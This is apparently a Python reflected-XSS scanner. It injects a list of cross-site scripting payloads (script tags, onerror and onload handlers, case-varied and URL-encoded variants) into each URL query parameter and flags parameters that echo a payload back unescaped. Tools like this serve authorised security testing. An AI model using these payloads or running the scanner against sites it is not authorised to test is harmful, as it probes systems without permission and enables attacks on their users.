"""XSS detection & exploitation"""

import requests
import urllib.parse
import re

class XSSEngine:
    def __init__(self):
        self.session = requests.Session()
        self.vulnerabilities = []
        
        self.payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '\'"><script>alert(1)</script>',
            'javascript:alert(1)',
            '<ScRiPt>alert(1)</ScRiPt>',
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '\'><img src=x onerror=alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
        ]
    
    def scan(self, url):
        print(f"\n=== XSS Scanner: {url} ===")
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            # Test URL itself
            for payload in self.payloads[:3]:
                test_url = url + payload if '?' not in url else url + '&test=' + payload
                self._check_reflected(test_url, payload)
            return self.vulnerabilities
        
        for param in params:
            print(f"  Testing parameter: {param}")
            for payload in self.payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(test_params, doseq=True))
                test_url = urllib.parse.urlunparse(test_url)
                
                if self._check_reflected(test_url, payload):
                    print(f"  [VULNERABLE] Parameter: {param}")
                    self.vulnerabilities.append({
                        'param': param,
                        'payload': payload,
                        'url': test_url
                    })
                    break  # One payload per param is enough
        
        if not self.vulnerabilities:
            print("[-] No XSS detected")
        else:
            print(f"\n[+] {len(self.vulnerabilities)} XSS vulnerabilities found")
        
        return self.vulnerabilities
    
    def _check_reflected(self, url, payload):
        try:
            r = self.session.get(url, timeout=10)
            if payload.lower() in r.text.lower():
                unescaped = payload.replace('&lt;', '<').replace('&gt;', '>')
                if unescaped in r.text:
                    return True
            # Check unencoded reflection
            if payload in r.text:
                return True
        except:
            pass
        return False